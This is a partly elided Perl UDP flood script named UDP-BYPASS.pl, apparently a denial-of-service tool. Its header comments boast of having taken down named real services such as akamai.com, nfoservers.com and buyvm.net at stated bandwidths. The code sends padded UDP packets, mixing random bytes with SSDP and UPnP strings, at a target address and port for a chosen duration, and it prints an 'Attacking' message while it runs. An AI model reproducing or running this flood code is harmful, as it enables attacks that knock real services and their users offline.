# akamai.com - Down ~> 5Gb/s
# bbhost.com.br - Down ~> 15Gb/s 
# nfoservers.com - Down
# anatel - Down ~> 2Gb/s
# buyvm.net - Down ~> 1.5Gb/s
...
print "
  [i] ~> perl UDP-BYPASS.pl <addr> <dport> <psize> <time>     
\n";
...
$iaddr = inet_aton("$ip") or die "[!] IP não DEFINIDO!\n";
$endtime = time() + ($time ? $time : 1000000);
		
	socket(flood, PF_INET, SOCK_DGRAM, 17);

print"
[!] ~> Attacking <$ip>, on port <$port>, for <$time> seconds.	
";
	...
	send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "urn:www-huawei-com:service" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\x00" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
	send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "ssdp:discover" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2]. "\x0z" .$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
	send(flood, $hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3]. "urn:schemas-upnp-org" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\xF0\x92\x90\xAB" .$hex[rand @hex].$hex[rand @hex].$hex[rand @hex].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
